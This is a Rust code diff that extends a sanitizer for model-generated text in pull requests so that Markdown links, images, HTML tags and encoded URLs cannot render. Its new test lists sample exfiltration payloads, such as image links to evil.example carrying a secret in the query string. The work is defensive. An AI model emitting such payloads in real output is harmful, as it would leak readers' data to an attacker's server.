@@ -78,7 +78,11 @@ pub(crate) fn is_bidi(c: char) -> bool {
 /// Model text made inert, as one line of at most [`MAX_FIELD_CHARS`]:
 /// line breaks and control characters become spaces, bidi controls are
 /// dropped, backticks become quotes, `@name`, `#123` and `://` get a
-/// zero-width space, and a leading Markdown block marker is escaped.
+/// zero-width space, and a leading Markdown block marker is escaped. Nothing
+/// that Markdown or GitHub turns into a link, an image or an HTML tag
+/// survives either (#357): `<`, `&` (entities such as `&colon;` decode to
+/// `:`), `](`, a protocol-relative `//` and `www.` get a zero-width space,
+/// so a PR cannot make the reader's browser fetch a URL with data in it.
 pub fn inert(text: &str) -> String {
     let flat: String = text
         .chars()
@@ -98,15 +102,22 @@ pub fn inert(text: &str) -> String {
         .take(MAX_FIELD_CHARS)
         .collect();
     let mut out = String::new();
-    if line.first().is_some_and(|c| "#>-*+|=~".contains(*c)) {
+    if line.first().is_some_and(|c| "#>-*+|=~[".contains(*c)) {
         out.push(ZWSP);
     }
     for (i, &c) in line.iter().enumerate() {
         out.push(c);
         let next = line.get(i + 1).copied().unwrap_or(' ');
+        let prev = i.checked_sub(1).map_or(' ', |p| line[p]);
+        let www = c == '.' && i >= 3 && line[i - 3..i].iter().all(|w| w.eq_ignore_ascii_case(&'w'));
         if (c == '@' && (next.is_ascii_alphanumeric() || next == '-'))
             || (c == '#' && next.is_ascii_digit())
             || (c == ':' && next == '/')
+            || (c == '/' && next == '/' && prev != ':')
+            || (c == ']' && next == '(')
+            || (c == '<' && (next.is_alphabetic() || "/!?".contains(next)))
+            || (c == '&' && (next.is_alphanumeric() || next == '#'))
+            || www
         {
             out.push(ZWSP);
         }
@@ -256,6 +267,33 @@ mod tests {
             "https://github.com/o/r/issues/1"
         );
         assert_eq!(link("https://x\n## fake"), "https:\u{200b}//x ## fake");
+    }
+
+    #[test]
+    fn model_text_cannot_make_the_reader_fetch_a_url() {
+        let bad = [
+            "![x](https://evil.example/a?d=secret)",
+            "![x](https&colon;//evil.example/a?d=1)",
+            "![x](//evil.example/a)",
+            "[x](https&#58;//evil.example)",
+            "<img src=\"//evil.example/a\">",
+            "<https://evil.example>",
+            "see www.evil.example/a",
+            "see WWW.evil.example",
+        ];
+        for text in bad {
+            let out = inert(text);
+            for needle in [
+                "](", "<i", "<h", "&c", "&#", "://", "(//", "\"//", "www.e", "WWW.e",
+            ] {
+                assert!(!out.contains(needle), "{text} -> {out:?}");
+            }
+        }
+        assert_eq!(inert("a <= b && c<d & e"), "a <= b && c<\u{200b}d & e");
+        assert_eq!(
+            inert("[ref]: https://x"),
+            "\u{200b}[ref]: https:\u{200b}//x"
+        );
     }
 
     #[test]
